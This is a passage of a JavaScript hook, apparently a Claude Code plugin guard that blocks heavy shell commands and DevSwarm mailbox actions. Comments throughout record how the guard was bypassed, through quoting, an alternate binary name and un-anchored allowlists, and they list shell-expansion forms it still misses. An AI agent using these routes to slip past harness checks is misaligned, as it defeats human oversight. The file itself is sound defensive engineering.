#!/usr/bin/env node
// anti-hall :: command-guard (PreToolUse Bash — coordinator only)
//
// WHAT IT DOES
//   Blocks heavy commands (build, test, deploy, push, pull, install, migrate, dumps,
//   bulk scripts) when running in a COORDINATOR context, requiring the model to
//   delegate them to a subagent instead. Silent pass-through in subagent context.
//
// COORDINATOR vs SUBAGENT DETECTION
//   PRIMARY signal (works across environments — including cmux and other wrappers
//   where a subagent inherits the parent's exact env): Claude Code injects `agent_id`
//   and `agent_type` into the PreToolUse hook PAYLOAD for Task-tool subagents. The
//   top-level coordinator's payload has NEITHER. This is the reliable discriminator.
//   SECONDARY signal: CLAUDE_CODE_ENTRYPOINT === "agent_tool" — set on the subagent
//   PROCESS in a vanilla `claude` CLI, but NOT reliable under cmux (stays "cli"), so
//   it is only a fallback.
//   A command is treated as SUBAGENT (allow) if EITHER signal indicates a subagent.
//
//   FAIL-OPEN POLICY: if context is ambiguous (no agent markers in the payload AND an
//   absent/unrecognized entrypoint), we DO NOT block — unknown contexts are treated as
//   subagent (allow). This prevents deadlock in non-standard or future environments.
//
// HEAVY COMMAND HEURISTIC
//   Checks the first verb and common heavy command patterns. Conservative: only blocks
//   commands that are unambiguously long/state-changing/noisy by first verb or pattern.
//   Does NOT block: git status/log/diff/show/branch, node --version, ls, cat, pwd, etc.
//
// Contract (Claude Code PreToolUse hook):
//   stdin  : JSON { tool_name, tool_input: { command } }
//   stdout : JSON { decision: "block", reason: "..." } | nothing
//   exit 2 : to block (decision field); exit 0: allow
//   Fail-open on ANY error (exit 0).

'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const {
  HEREDOC_RE,
  basename,
  parseHeredocAt,
  tokenizeQuoted,
  dequoteSegment,
  extractSubstitutions,
  SHELL_VERBS,
} = require('./lib/shell-scan.js');
// v0.108.0 unified settings (env > ~/.anti-hall/settings.json > default);
// fail-open to `undefined` (never the value that would arm/allow a guard).
function settingsGet(section, key) {
  try { return require('./lib/settings.js').get(section, key); } catch (_) { return undefined; }
}

// Commands whose FIRST WORD (verb) are always heavy in coordinator context.
const HEAVY_VERBS = new Set([
  // Package managers / install
  'npm', 'npx', 'pnpm', 'yarn', 'bun', 'pip', 'pip3', 'poetry', 'uv', 'conda',
  // Build / compile / bundle
  'make', 'cmake', 'gradle', 'mvn', 'ant', 'bazel', 'buck', 'ninja',
  'tsc', 'swc', 'esbuild', 'rollup', 'vite', 'webpack', 'turbo',
  // Test runners
  'pytest', 'jest', 'vitest', 'mocha', 'jasmine', 'karma', 'cypress', 'playwright',
  'flutter', 'go', 'cargo', 'dotnet',
  // Deploy / infra
  'firebase', 'gcloud', 'aws', 'az', 'kubectl', 'helm', 'terraform', 'pulumi',
  'serverless', 'vercel', 'netlify', 'heroku',
  // DB / migrate
  'psql', 'mysql', 'mongosh', 'redis-cli', 'sqlite3', 'prisma', 'knex', 'alembic',
  'flyway', 'liquibase',
  // Other long-running / state-changing
  'docker', 'podman', 'vagrant', 'ansible',
]);

// Patterns checked against full command string (case-insensitive).
const HEAVY_PATTERNS = [
  // npm/yarn/pnpm run scripts that are build/test/deploy
  /\bnpm\s+run\s+(?:build|test|deploy|start|lint|typecheck|check)\b/i,
  /\byarn\s+(?:run\s+)?(?:build|test|deploy|start|lint|typecheck|check)\b/i,
  /\bpnpm\s+(?:run\s+)?(?:build|test|deploy|start|lint|typecheck|check)\b/i,
  // git push/pull/fetch/clone (not git status/log/diff etc.)
  /\bgit\s+(?:push|pull|fetch|clone)\b/i,
  // python/node/deno long-running scripts
  /\bpython[23]?\s+\S+\.py\b/i,
  /\bnode\s+\S+\.(?:js|mjs|cjs)\b/i,
  /\bdeno\s+(?:run|task)\b/i,
];

// anchoredAntiHallCli(dir, script, tailSrc) -> RegExp for one of anti-hall's
// own CLI allowlist entries below. Every entry MUST be built through this one
// helper so a future addition can't forget the anchoring discipline that
// bcd0d69 first applied to the defect.js entry alone (a real, shipped bypass:
// the un-anchored `\b`-only form matches ANYWHERE in the segment, so `npm run
// build -- node scripts/devswarm.js list` / `... settings.js show` slipped a
// heavy command through just by mentioning an allowlisted script as trailing
// args).
//
// The produced regex requires the SEGMENT to literally START with (optional
// leading `KEY=val` env assignments, then) `node <path>/<dir>/<script>.js`:
//   - `^\s*` anchors to the segment start (segments are already split on
//     `;`/`&&`/`||`/`|`/newlines by splitSegments before this runs).
//   - `(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*` allows leading env assignments
//     only (e.g. `FOO=1 node scripts/defect.js list`), matching the one
//     allowance the pre-existing defect.js anchor already granted.
//   - `node\s+(?:\S*[\\/])?<dir>[\\/]<script>\.js` requires `node` to be the
//     segment's OWN verb (not merely present later in the line), with an
//     optional arbitrary path prefix before `<dir>/<script>.js` (both `/`
//     and `\` accepted for Windows parity), same discipline every pre-
//     existing entry already used for the parent-dir segment.
//   - `tailSrc` is the caller's own subcommand/flag restriction (already
//     regex source, not a literal), appended unchanged right after the
//     script name — e.g. `\s+(?:-\S+\s+)*status\b` for jev-setup.js.
function anchoredAntiHallCli(dir, script, tailSrc) {
  const dirSrc = dir.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const scriptSrc = script.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  return new RegExp(
    '^\\s*(?:[A-Za-z_][A-Za-z0-9_]*=\\S*\\s+)*node\\s+(?:\\S*[\\\\/])?' +
      dirSrc + '[\\\\/]' + scriptSrc + '\\.js' + tailSrc,
    'i'
  );
}

// anchoredAntiHallStableLauncher(scriptFile) -> RegExp for one of the two
// version-independent ~/.anti-hall/bin/ stable launchers (hooks/lib/
// stable-launcher.js: devswarm.js, wake-watch.js). ROOT CAUSE (peer report,
// downstream-project Primary, 2026-09-26): anchoredAntiHallCli('scripts', 'devswarm',
// '\\b') above only exempts the PLUGIN-RELATIVE `.../scripts/devswarm.js`
// form. Since the devswarm.stableLauncher setting defaulted on (v0.109+),
// every hook-emitted directive (mailbox wake cron, Monitor re-arm command,
// DevSwarm comms override, Stop-gate drain/handover text) instead names the
// STABLE LAUNCHER path under ~/.anti-hall/bin/ — a form the old regex never
// recognized, so it fell through to the generic `node <file>.js`
// HEAVY_PATTERN and every Primary's cron tick / inline mesh command using
// the launcher was wrongly blocked.
//
// Now shared with git-guard.js via hooks/lib/stable-launcher.js (was a
// byte-for-byte duplicate in each file — see that module's own doc comment
// for the full anchoring rationale: which home-anchor forms are accepted,
// and why the anchoring stays as narrow as anchoredAntiHallCli above).
const { anchoredAntiHallStableLauncher } = require('./lib/stable-launcher.js');
const { emitBlock } = require('./lib/emit-block.js');

// Commands that look heavy by verb but are actually lightweight inspection commands.
// We allow these even if the verb matches HEAVY_VERBS.
const GIT_READONLY_RE = new RegExp(
  [
    '\\bgit\\s+(?:status|log|diff|show|branch(?:\\s+--list)?|rev-parse|config\\s+--get|config\\s+--list|',
    'worktree\\s+list|remote\\s+-v|shortlog|stash\\s+list|tag\\s+-l|describe|ls-remote|ls-tree|',
    'merge-base|reflog\\s+show)\\b',
  ].join(''),
  'i',
);

const LIGHT_EXCEPTIONS = [
  // git subcommands that are read-only / instant
  GIT_READONLY_RE,
  // git fetch alone only updates local remote-tracking refs/objects — it never
  // touches the working tree or any local branch, so it is read-only from the
  // working-tree's perspective (unlike push/pull, which stay gated below).
  // The actual exemption is isSafeGitFetch() below (P1 fix: a `:` refspec, a
  // leading `+` refspec, or --prune/-p/--prune-tags/--force/-f can rewrite or
  // delete local remote-tracking refs, so a bare `\bgit\s+fetch\b` match here
  // would wrongly exempt those too — checked per-segment in isHeavySegment).
  // npm/node version queries
  /\bnpm\s+(?:--version|-v|view|info|ls)\b/i,
  // `node -e "..."` / `-e '...'` is intentionally NOT blanket-exempted here —
  // its content is classified by isSafeNodeEval() below (write/spawn-API
  // deny-list) instead of a blind quoted-content match, so a write/spawn
  // payload (e.g. `-e "require('fs').writeFileSync(...)"`) is correctly
  // still gated.
  /\bnode\s+(?:--version|-v)\b/i,
  /\bflutter\s+--version\b/i,
  /\bgo\s+version\b/i,
  /\bcargo\s+(?:--version|version)\b/i,
  // go env (read-only) — but NOT `go env -w KEY=VAL` which mutates config.
  /\bgo\s+env\b(?![^\n]*\s-w\b)/i,
  // git push/pull with --dry-run is non-mutating (no refs/objects change).
  /\bgit\s+(?:push|pull)\b[^\n]*\s--dry-run\b/i,
  // docker ps/images/inspect (read-only)
  /\bdocker\s+(?:ps|images|inspect|logs|stats)\b/i,
  // sqlite3 opened with -readonly, and gcloud/gh/kubectl read-only inspection
  // subcommands: the actual exemptions are isSafeSqliteReadonly() and
  // isReadOnlyCloudInspect() below (P1/P2 fix: the old regexes here did a
  // \b-boundary SUBSTRING match, so `-readonly` matched even as a substring
  // of a longer flag and `list`/`get`/`describe`/`view` matched inside a
  // LATER compound word like `list-users` or `get-worker-1` — e.g. `gcloud
  // functions deploy list-users` and `kubectl delete pod get-worker-1` both
  // slipped through as "read-only" even though the real verb was the
  // mutating `deploy`/`delete`. Checked per-segment in isHeavySegment().
  // anti-hall's own read-only CLI subcommands. Each is a NARROW, anchored
  // exemption of one specific script + one specific read-only subcommand set
  // (not the whole script), mirroring the devswarm.js carve-out's anchoring
  // discipline (parent dir segment anchored at token start or path separator,
  // both `/` and `\` accepted) so a look-alike prefix is never exempted.
  //
  // ALL of the entries below are built with anchoredAntiHallCli() (see its
  // doc comment further down this file for why). Every one is ALSO anchored
  // to the START of the segment (optional leading env assignments only):
  // `node` must be the segment's own verb, so a heavy command merely
  // carrying an allowlisted script as trailing args (`npm run build -- node
  // scripts/devswarm.js list`) is never exempted. bcd0d69 anchored only the
  // defect.js entry this way; every entry below now shares that same
  // discipline through the one helper so a future addition can't forget it.
  //   jev-setup.js status        — read-only status report (enable/disable/
  //                                 set-key/test/mode are NOT matched, still gated)
  anchoredAntiHallCli('scripts', 'jev-setup', '\\s+(?:-\\S+\\s+)*status\\b'),
  //   settings.js show|get       — read-only (set/reset are NOT matched)
  anchoredAntiHallCli('scripts', 'settings', '\\s+(?:-\\S+\\s+)*(?:show|get)\\b'),
  //   jev-report.js (default)    — read-only report/scorecard UNLESS its first
  //                                 positional argument is the mutating `label`
  //                                 or `prune-audit` subcommand (negative lookahead)
  anchoredAntiHallCli('scripts', 'jev-report', '\\b(?![^\\n]*\\b(?:label|prune-audit)\\b)'),
  //   defect.js report|list|show|recurring|similar — anti-hall's own
  //   defect-report CLI (see scripts/defect.js). ONLY these subcommands are
  //   exempt: `report` appends one line to a defect file (never
  //   rewrites/deletes); `list`/`show` and the bug-history reads
  //   `recurring`/`similar` are pure reads (the root-cause skill tells the
  //   main thread to run `similar` before an anti-hall fix). Deliberately
  //   NARROWER than this: `rule` (maintainer ruling), `archive` (rotation
  //   sweep — MOVES files between directories) and `backfill` (writes
  //   history records) are NOT matched here, so they stay gated like every
  //   other mutating command.
  anchoredAntiHallCli('scripts', 'defect', '\\s+(?:-\\S+\\s+)*(?:report|list|show|recurring|similar)\\b'),
  // hooks/doctor.js: read-only diagnostics by default — --repair/--fix (and the
  // explicit opt-in repair flags, including --reclaim-ingest-lock, which forces
  // a stale-lock takeover — a mutating action) switch it to a mutating repair
  // pass, so any of those flags anywhere on the line disqualifies the exemption.
  anchoredAntiHallCli('hooks', 'doctor', '\\b(?![^\\n]*--(?:repair|fix|repair-ingest-orphans|repair-test-stores|reclaim-ingest-lock)\\b)'),
  // anti-hall's own coordinator-owned phase-state helpers. These are documented
  // to run INLINE on the main thread on purpose — phase-state is written by the
  // coordinator, never a subagent (orchestration/SKILL.md, ship-it/SKILL.md).
  // Without this carve-out the generic `node <file>.js` HEAVY_PATTERN would make
  // the documented workflow impossible (a catch-22). NARROW by design: it matches
  // ONLY the exact plugin-relative helper paths `statusline/phase.js` and
  // `hooks/agent-watchdog.js`, with the parent dir segment anchored (either at the
  // token start or immediately after a path separator) so a look-alike prefix
  // (`evilstatusline/phase.js`) or an arbitrary `node evil.js` is NOT exempted.
  // Both `/` and `\` separators are accepted so it resolves identically on Windows.
  anchoredAntiHallCli('statusline', 'phase', '\\b'),
  anchoredAntiHallCli('hooks', 'agent-watchdog', '\\b'),
  // anti-hall's own DevSwarm CLI wrapper (scripts/devswarm.js). It is THE
  // structured interface the guard steers users toward (CLI over MCP), so the
  // generic `node <file>.js` HEAVY_PATTERN blocking its own wrapper is the exact
  // catch-22 called out in PLAN.md "Phase 2 — scope corrections". Same NARROW,
  // anchored discipline as the phase.js / agent-watchdog.js carve-outs above:
  // matches ONLY `scripts/devswarm.js` with the parent dir segment anchored at a
  // token start or path separator (so `evilscripts/devswarm.js` is NOT exempt),
  // both `/` and `\` separators for Windows parity.
  // CONFIRMED GENERALIZED (v0.58 PLAN.md "GUARD CONTRACT" EXEMPTION note): this
  // regex has no subcommand restriction — it exempts the WHOLE `node .../scripts/
  // devswarm.js ...` invocation regardless of verb, so every mesh coordination
  // command (`send`, `heartbeat`, `roster`, `mesh`, `inbox`, `archive-request`,
  // `reconcile`, `spawn`, `merge`) already runs inline, exempt from the heavy-
  // command gate, with no further change needed here.
  anchoredAntiHallCli('scripts', 'devswarm', '(?=\\s|$)'), // file name must END at devswarm.js (not .js.evil / .jsx / .js2)
  // anti-hall's own version-independent stable launchers under
  // ~/.anti-hall/bin/ (hooks/lib/stable-launcher.js) — the SAME
  // scripts/devswarm.js CLI wrapper (and its companion wake-watch poller),
  // just reached through a home-anchored, version-independent path that
  // every hook-emitted directive (mailbox wake cron, Monitor re-arm,
  // DevSwarm comms override, Stop-gate drain/handover) now names when the
  // devswarm.stableLauncher setting is on (default). Without this, every one
  // of those emitted commands fell through to the generic `node <file>.js`
  // HEAVY_PATTERN and was wrongly blocked (0.114.1 hotfix). See
  // anchoredAntiHallStableLauncher's own doc comment for the anchoring
  // discipline (home-anchored only; no subcommand restriction, mirroring the
  // plugin-relative devswarm.js entry immediately above).
  anchoredAntiHallStableLauncher('devswarm.js'),
  anchoredAntiHallStableLauncher('wake-watch.js'),
  // The update skill's own helper, run IN-SESSION on the main model (owner
  // decision: update.js runs migrations, so it is never handed to a cheap
  // subagent). Matches ONLY `node [quoted] <any prefix>/skills/update/scripts/
  // update.js` (plugin cache, marketplace clone, repo checkout) as the
  // segment's own verb: the dir chain must be exactly skills/update/scripts/,
  // and the file name must END at update.js (optional closing quote, then
  // whitespace/end) so `update.js.evil` / `other/scripts/update.js` stay
  // gated. Chained commands are separate segments (`; npm test` still blocks);
  // only bounded sinks (tail/head/grep) are light on their own.
  /^\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*node\s+["']?(?:\S*[\\/])?skills[\\/]update[\\/]scripts[\\/]update\.js["']?(?=\s|$)/i,
  // The two DevSwarm companion installers the update skill's step 7 runs
  // in-session for the same reason (they install/refresh a launchd/systemd
  // unit; the main session judges a failure). Same anchoring: own-verb `node`,
  // file name ends at the installer's name.
  anchoredAntiHallCli('companion', 'install-devswarm-supervisor', '(?=\\s|$)'),
  anchoredAntiHallCli('companion', 'install-devswarm-ingest', '(?=\\s|$)'),
];

// DevSwarm destructive-read redirect: the two CONSUMING native hivecontrol inbox
// reads — `hivecontrol workspace read-messages` (mark-reads / drains the native
// message queue) and `hivecontrol workspace monitor` (a blocking long-poll that
// also consumes the queue). Non-destructive subcommands (message-count,
// message-parent, message-child) and any other subcommand are NOT matched
// (default-allow). Optional flag tokens are tolerated on both sides so
// `hivecontrol --json workspace read-messages` / `hivecontrol workspace --foo
// monitor` cannot slip past by flag insertion. Under DevSwarm BOTH block
// UNCONDITIONALLY (Part B): `read-messages` no longer requires durable-layer
// evidence — a raw native read desyncs the durable cursor regardless, so it blocks
// like `monitor`. Kept as TWO regexes so the block reason can name the specific
// destructive subcommand (see buildDevswarmReason).
// DEVSWARM_CLI_VERBS: `devswarm` is the PRIMARY DevSwarm CLI binary name;
// `hivecontrol` is a thin sh shim that `exec`s the SAME sibling `devswarm`
// binary (both ship on PATH as the identical program). Every regex/verb-check
// below that reasons about "the DevSwarm CLI verb" MUST treat both names as
// equivalent, or the guard is trivially bypassed by typing the other name —
// this is exactly the confirmed bypass this block fixes (`devswarm workspace
// monitor`/`read-messages`/`message-child`/`message-parent` sailed through
// while the byte-identical `hivecontrol` form correctly blocked). ONE shared
// alternation fragment feeds all four regexes AND the two effectiveVerb
// equality checks below so the names can never drift apart again.
const DEVSWARM_CLI_VERBS = new Set(['hivecontrol', 'devswarm']);
const DEVSWARM_CLI_VERB_ALT = '(?:hivecontrol|devswarm)';
const HIVECTL_MONITOR =
  new RegExp('\\b' + DEVSWARM_CLI_VERB_ALT + '\\s+(?:-\\S+\\s+)*workspace\\s+(?:-\\S+\\s+)*monitor\\b', 'i');
const HIVECTL_READ_MESSAGES =
  new RegExp('\\b' + DEVSWARM_CLI_VERB_ALT + '\\s+(?:-\\S+\\s+)*workspace\\s+(?:-\\S+\\s+)*read-messages\\b', 'i');

// v0.58 "mesh-only messaging" (PLAN.md GUARD CONTRACT): the two native SEND
// subcommands — `hivecontrol workspace message-child` / `message-parent` — are
// REPLACED by anti-hall's shared mesh store (scripts/devswarm.js send/heartbeat).
// Modeled EXACTLY on HIVECTL_MONITOR/HIVECTL_READ_MESSAGES above (same optional-
// flag tolerance so `hivecontrol --json workspace message-parent` cannot slip
// past by flag insertion). Deliberately does NOT match `message-count` (a
// read-only counter — distinct literal subcommand, never blocked) or any
// lifecycle verb (`create`/`list`/`check-merge`/`merge`) — those are unmatched
// by construction (different literal text) and stay default-allow, so
// `devswarm.js spawn`/`merge` (THIN wraps of hivecontrol create/check-merge/
// merge) keep working.
const HIVECTL_MESSAGE_CHILD =
  new RegExp('\\b' + DEVSWARM_CLI_VERB_ALT + '\\s+(?:-\\S+\\s+)*workspace\\s+(?:-\\S+\\s+)*message-child\\b', 'i');
const HIVECTL_MESSAGE_PARENT =
  new RegExp('\\b' + DEVSWARM_CLI_VERB_ALT + '\\s+(?:-\\S+\\s+)*workspace\\s+(?:-\\S+\\s+)*message-parent\\b', 'i');

// hivectlSegmentHasHelpFlag(seg) -> true iff this SEGMENT's argv (tokenized the
// same quote-aware way as every other token scan in this file — tokenizeQuoted,
// shared with git-guard.js via ./lib/shell-scan.js) contains a bare `--help` or
// `-h` token. A read-only `--help`/`-h` invocation of a gated hivecontrol/devswarm
// subcommand (`hivecontrol workspace read-messages --help`, `... monitor -h`,
// `... message-child --help`) never touches the mailbox/mesh — it just prints
// usage and exits — so it is not the destructive-read / native-send action this
// guard exists to stop. Checked PER SEGMENT (splitSegments already isolates
// shell-chained commands: `;`, `&&`, `||`, `|`, newlines), so a smuggled
// `hivecontrol workspace message-child --help ; hivecontrol workspace
// message-child x` still blocks on its SECOND segment, which carries no
// --help/-h token of its own. Token-exact match only (`--help`/`-h` as their
// own argv word) — a token that merely CONTAINS "help" as a substring
// (`--help-me`, a file literally named `-h`) does not count, mirroring how a
// real arg parser distinguishes a flag from an arbitrary operand.
function hivectlSegmentHasHelpFlag(seg) {
  const tokens = tokenizeQuoted(seg);
  return tokens.some((t) => t === '--help' || t === '-h');
}

// detectHivectlDestructiveRead(command, depth) -> 'monitor' | 'read-messages' | null.
// Mirrors isHeavyCommand's matching discipline so DATA and CODE are separated the
// same way the heavy path does it: the per-segment regex test runs against the
// DEQUOTED segment — dequoteSegment(seg), the SHELL-EFFECTIVE argv text — so a
// quoted subcommand or verb (`hivecontrol workspace "monitor"`, `"hivecontrol"
// workspace monitor`, a mid-token split `mes"sage-par"ent`) matches IDENTICALLY
// to its unquoted form, because that is what the shell actually executes: quoting
// a bareword does not change argv. (FIXED P0: this previously ran against
// neutralizeQuotedContents(seg), which BLANKS quoted content instead of
// dequoting it — that made every quoted variant of a blocked subcommand
// invisible to the regex, a live-verified bypass of the single-consumer
// invariant.) Quoted DATA passed to an unrelated verb still safely ALLOWS:
// `grep 'hivecontrol workspace read-messages' f` / `echo "...monitor..."`
// dequote to `grep hivecontrol workspace read-messages f` / `echo ...monitor...`,
// but COMMAND-POSITION ANCHORING below reads the FIRST token as `grep`/`echo`,
// not `hivecontrol`, so they still do NOT match. `bash -c "..."`, `eval ...`,
// `$(...)` and backtick payloads ARE unwrapped and recursed (so a smuggled
// `bash -c "hivecontrol workspace read-messages"` / `$(hivecontrol workspace
// monitor)` STILL matches). `monitor` wins over `read-messages` when both
// appear, because monitor blocks unconditionally.
function detectHivectlDestructiveRead(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  let sawReadMessages = false;
  for (const seg of splitSegments(command)) {
    const dequoted = dequoteSegment(seg);
    // COMMAND-POSITION ANCHORING: only treat `hivecontrol` as the destructive verb
    // when it is actually THIS segment's command verb (mirrors the heavy path's
    // effectiveVerb discipline — basename + wrapper/assignment skipping), not merely
    // a word that happens to appear somewhere in the args. This drops the
    // false-positive where unquoted data args are literally these words in order —
    // `grep hivecontrol workspace monitor docs/KB.md`, `echo hivecontrol workspace
    // monitor` — which have verb `grep`/`echo`, not `hivecontrol`, so they ALLOW.
    // Smuggling is UNAFFECTED: `bash -c "..."`, `$(...)`, backtick, `eval`, and
    // chained (`a && hivecontrol ...`) forms each put hivecontrol at verb position
    // inside a recursively-extracted payload / its own segment, and a path- or
    // flag-prefixed form (`/usr/bin/hivecontrol workspace monitor`,
    // `sudo hivecontrol ...`) still resolves to `hivecontrol` via effectiveVerb —
    // now checked against the DEQUOTED segment (effectiveVerb(dequoted)) so a
    // quoted verb (`"hivecontrol" workspace monitor`) anchors correctly too.
    //
    // ACCEPTED LIMITATION (drift-guard threat model, NOT an adversary defense):
    // dequoting only recovers quote-delimited obfuscation. Forms that only
    // synthesize the verb/subcommand via shell PARAMETER or COMMAND expansion are
    // still NOT caught — `mon${X:-itor}`, `mon$(printf itor)`. Catching those
    // would need a full shell-expansion simulation, which is out of scope: this
    // guard prevents ACCIDENTAL and quote-obfuscated destructive reads, not a
    // determined shell-expansion bypass. Tests document these as knowingly-allowed.
    if (DEVSWARM_CLI_VERBS.has(effectiveVerb(dequoted)) && !hivectlSegmentHasHelpFlag(seg)) {
      if (HIVECTL_MONITOR.test(dequoted)) return 'monitor';
      if (HIVECTL_READ_MESSAGES.test(dequoted)) sawReadMessages = true;
    }
    if (d < 3) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = detectHivectlDestructiveRead(payload, d + 1);
        if (inner === 'monitor') return 'monitor';
        if (inner === 'read-messages') sawReadMessages = true;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = detectHivectlDestructiveRead(evalPayload, d + 1);
        if (inner === 'monitor') return 'monitor';
        if (inner === 'read-messages') sawReadMessages = true;
      }
    }
  }
  if (d < 3) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectHivectlDestructiveRead(inner, d + 1);
      if (r === 'monitor') return 'monitor';
      if (r === 'read-messages') sawReadMessages = true;
    }
  }
  return sawReadMessages ? 'read-messages' : null;
}

// detectHivectlMessageSend(command, depth) -> 'message-child' | 'message-parent' | null.
// Mirrors detectHivectlDestructiveRead's matching discipline byte-for-byte: the
// per-segment regex test runs against the DEQUOTED segment — dequoteSegment(seg),
// the SHELL-EFFECTIVE argv text — so a quoted subcommand or verb
// (`hivecontrol workspace "message-parent"`, `"hivecontrol" workspace
// message-parent`, a mid-token split `mes"sage-par"ent`) matches IDENTICALLY to
// its unquoted form, because quoting a bareword does not change argv. (FIXED
// P0: this previously ran against neutralizeQuotedContents(seg), which BLANKS
// quoted content instead of dequoting it — a live-verified bypass of v0.58's
// mesh-only-messaging invariant, since the guard's own block reason echoes the
// blocked subcommand back, making "just quote it" the natural retry.) Quoted
// DATA passed to an unrelated verb still safely ALLOWS: `grep 'hivecontrol
// workspace message-parent' docs/KB.md` / `echo "...message-child..."` dequote
// to `grep hivecontrol workspace message-parent docs/KB.md` / `echo
// ...message-child...`, but COMMAND-POSITION ANCHORING below reads the FIRST
// token as `grep`/`echo`, not `hivecontrol`, so they still do NOT match.
// `bash -c "..."`, `eval ...`, `$(...)` and backtick payloads ARE unwrapped and
// recursed (a smuggled `bash -c "hivecontrol workspace message-parent ..."` /
// `$(hivecontrol workspace message-child ...)` STILL matches).
// COMMAND-POSITION ANCHORING via effectiveVerb(dequoted) === 'hivecontrol' (the
// same false-positive protection as the destructive-read detector, now also
// dequoted so a quoted verb anchors correctly). message-child is checked first
// (arbitrary tie-break; both matching one command is not a realistic shape) —
// MUST match ONLY its own literal subcommand, never `message-count`/`create`/
// `list`/`check-merge`/`merge`.
function detectHivectlMessageSend(command, depth) {
  if (typeof command !== 'string' || !command.trim()) return null;
  const d = typeof depth === 'number' ? depth : 0;
  for (const seg of splitSegments(command)) {
    const dequoted = dequoteSegment(seg);
    if (DEVSWARM_CLI_VERBS.has(effectiveVerb(dequoted)) && !hivectlSegmentHasHelpFlag(seg)) {
      if (HIVECTL_MESSAGE_CHILD.test(dequoted)) return 'message-child';
      if (HIVECTL_MESSAGE_PARENT.test(dequoted)) return 'message-parent';
    }
    if (d < 3) {
      const payload = extractShellCPayload(seg);
      if (payload) {
        const inner = detectHivectlMessageSend(payload, d + 1);
        if (inner) return inner;
      }
      const evalPayload = extractEvalPayload(seg);
      if (evalPayload) {
        const inner = detectHivectlMessageSend(evalPayload, d + 1);
        if (inner) return inner;
      }
    }
  }
  if (d < 3) {
    for (const inner of extractSubstitutions(command)) {
      const r = detectHivectlMessageSend(inner, d + 1);
      if (r) return r;
    }
  }
  return null;
}

// devswarm-subagent-mailbox-guard: defect f0958b13fe2b (P0, field-measured by
// a downstream project 2026-09-08). Inside a DevSwarm child workspace, the child's OWN
// subagents ran `node .../scripts/devswarm.js inbox pull <id> && ... inbox
// ack <id>` — 155 executions across 120 subagent transcripts in one
// workspace. Each ack ADVANCES THE SHARED CURSOR, so the workspace's own MAIN
// THREAD silently missed mail it never got to read. Brief-level prohibitions
// ("subagents must not touch the mailbox") were proven NON-MITIGATING in the
// field — only a mechanical guard closes it.
//
// Matches the devswarm.js CLI (any path prefix — dev clone, marketplace
// cache, absolute path — with or without a `node` prefix; same anchored
// `scripts[\\/]devswarm\.js` suffix EXEMPT_PATTERNS already uses above, so it
// resolves identically) invoking a CURSOR-ADVANCING / MAILBOX-CONSUMING verb
// (per scripts/devswarm.js's own cmdInbox ~line 8134-8180, cmdHeartbeat,
// cmdMeshRead ~line 12332, and reap-orphans's cursor writes ~line 13396):
//   inbox pull | inbox ack | inbox read | inbox read-primary | inbox tick
//   heartbeat (top-level) | reap-orphans (top-level, writes cursors on reap)
//   inbox messages ... --ack | --ack-as-owner (P0 Wave R3 fix: the DOCUMENTED
//     expansion of read-primary — SKILL.md — DOES write the cursor via
//     cmdInboxMessagesInner's doAck path, ~line 7521-7522; NOT the same as
//     the safe, non-acking `inbox messages` this guard otherwise allows)
//   mesh read (WITHOUT --peek/--seq — ~line 12332 advances the broadcast
//     cursor by default; `--peek`/`--seq N` are the documented non-mutating
//     forms and stay allowed)
//   roster --ack (an ALIAS of `mesh read`, D23 — scripts/devswarm.js's own
//     `case 'roster'` dispatches to cmdMeshRead when `--ack` is present;
//     plain `roster` with no `--ack` is a pure read-only projection)
//   register | archive (top-level; Wave R3 P2, R4 Critic: both advance
//     cursors through foldGroupIntoSurvivor ~line 2654, invoked from
//     retireWorktreeDuplicates ~2562 and retireArchivedWorktreeGroup ~3350 —
//     a subagent never legitimately registers or archives a workspace, that
//     is a main-thread/coordinator lifecycle action. `register-primary` and
//     `archive-request`/`archive-ignore`/`archive-unignore`/`unarchive` are
//     SEPARATE verbs, deliberately unaffected.)
// Deliberately ALLOWS (verified against scripts/devswarm.js: does NOT advance
// the durable cursor):
//   inbox count, inbox messages (incl. --tail, WITHOUT --ack/--ack-as-owner —
//   non-acking per cmdInbox's own `sub !== 'messages'` window-rejection
//   guard), inbox peek-primary (opts `{ ack: false, unread: true }` at
//   cmdInbox ~line 8165 — a non-mutating view by design, its own error text
//   at ~line 7101 recommends it FOR this exact purpose), mesh read --peek /
//   --seq N, plain roster (no --ack), send, register-primary,
//   archive-request/archive-ignore/archive-unignore/unarchive,
//   workspaces/gate/etc (unmatched by construction).
//
// NOTE: an earlier draft of this defect's brief also named a `drain` verb —
// scripts/devswarm.js has NO such verb (confirmed: no `case 'drain'`
// anywhere in the file); not matched here since it does not exist.
//
// Fires whenever the payload shows SUBAGENT context via PAYLOAD MARKERS ONLY
// (isSubagentByPayload(payload) — coordinator-detect.js; Wave R3 P2 fix: the
// general-purpose isSubagent()'s CLAUDE_CODE_ENTRYPOINT=agent_tool env
// fallback is deliberately NOT used here — a DevSwarm child workspace's env
// is inherited by its entire process tree, so a leaked agent_tool value from
// how the CHILD SESSION ITSELF was originally spawned would otherwise
// misclassify that workspace's own main-thread cron tick / Monitor wake as a
// subagent forever, blocking it from its own mailbox), REGARDLESS of
// DevSwarm-active/child-workspace status: an accidental subagent
// mailbox-touch is wrong even outside a recognized child workspace (it may
// be running against the PARENT's own registry). Modeled on
// devswarm-read-guard/devswarm-send-guard above: its OWN skip name
// (`devswarm-subagent-mailbox-guard`), independent of command-guard's own
// skip/coordinator gate below, PLUS a dedicated env override
// (`ANTIHALL_ALLOW_SUBAGENT_MAILBOX=1`) for a deliberate one-off.
// Fully fail-open: any throw -> fall through (never block on a guard bug).
//
// Codex parity: this guard is registered via the SHARED command-guard.js in
// codex/hooks/hooks.json — no separate Codex code path. Its DENY behavior
// depends on the harness actually supplying subagent markers (agent_id/
// agent_type) in the hook payload; this has been VERIFIED ON CLAUDE CODE
// ONLY. A grep of plugins/anti-hall/codex for agent_id/agent_type returns 0
// hits (codex/README.md:48 confirms no such payload-marker mapping exists
// there), so whether Codex's harness populates these fields the same way is
// UNVERIFIED — the guard is registered either way (fail-open if the markers
